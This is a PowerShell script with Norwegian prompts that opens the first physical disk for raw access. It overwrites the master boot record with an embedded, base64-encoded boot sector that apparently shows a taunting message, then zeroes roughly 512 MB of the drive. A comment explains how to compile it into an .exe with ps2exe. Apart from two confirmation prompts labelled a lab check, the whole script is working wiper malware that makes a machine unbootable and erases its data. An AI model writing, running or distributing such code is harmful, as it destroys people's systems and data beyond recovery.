

# get option -delete: example usage: .\delMBR.ps1 -delete -> exe (ps2exe -inputFile delMBR.ps1 -outputFile delMBR.exe) -> example usage: .\delMBR.exe -delete

#lab confirm
Read-Host "Er du sikker på at du vil slette MBR? (ja/nei)" | ForEach-Object {
    if ($_ -ne "ja") {
        throw "Operasjonen ble avbrutt."
    }
}
Read-Host "Er du sikker trykk enter for å fortsette." 
# Bekreftelse før destruktiv handling

param(
    [switch]$delete
)

if (-not $delete) {
    throw "Du må spesifisere -delete for å slette MBR."
    exit 1
}

$code = @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class RawDisk {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );
}
"@
Add-Type -TypeDefinition $code

[uint32]$GENERIC_RW = "0xC0000000"
[uint32]$FILE_SHARE_RW = 3
[uint32]$OPEN_EXISTING = 3

$diskPath = "\\.\PhysicalDrive0"

$handle = [RawDisk]::CreateFile($diskPath, $GENERIC_RW, $FILE_SHARE_RW, [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)

if ($null -eq $handle -or $handle.IsInvalid) {
    throw "Kunne ikke åpne disken. Husk å kjøre PowerShell som Administrator."
}

try {
    $fs = New-Object System.IO.FileStream($handle, [System.IO.FileAccess]::ReadWrite)
    
    $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $chunkSize  = 512
    $totalBytes = [int64]512 * 1000000
    $zeroBuffer = New-Object byte[] $chunkSize
    $written = 0L
    $firstSectorDataBase54 = [Convert]::FromBase64String("McCO2I7AjtC8AHy+HXy0DqyEwHQEzRDr9/r06/xZb3UncmUgc3RyYWlnaHQgQ29vY2tlZCBidWRkeQ0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVao=")

    try {
        while ($written -lt $totalBytes) {
            if ($written -lt 512) {
                $toWrite = [Math]::Min($chunkSize, $totalBytes - $written)
                $fs.Write($firstSectorDataBase54, 0, $toWrite)
                $written += $toWrite
                continue
            }
            $toWrite = [Math]::Min($chunkSize, $totalBytes - $written)
            $fs.Write($zeroBuffer, 0, $toWrite)
            $written += $toWrite
        }
        $fs.Flush()
    }
    catch {
        $sektor = $written / 512
        throw
    }
}
finally {
    if ($fs) { $fs.Close() }
    if ($handle) { $handle.Close() }
}
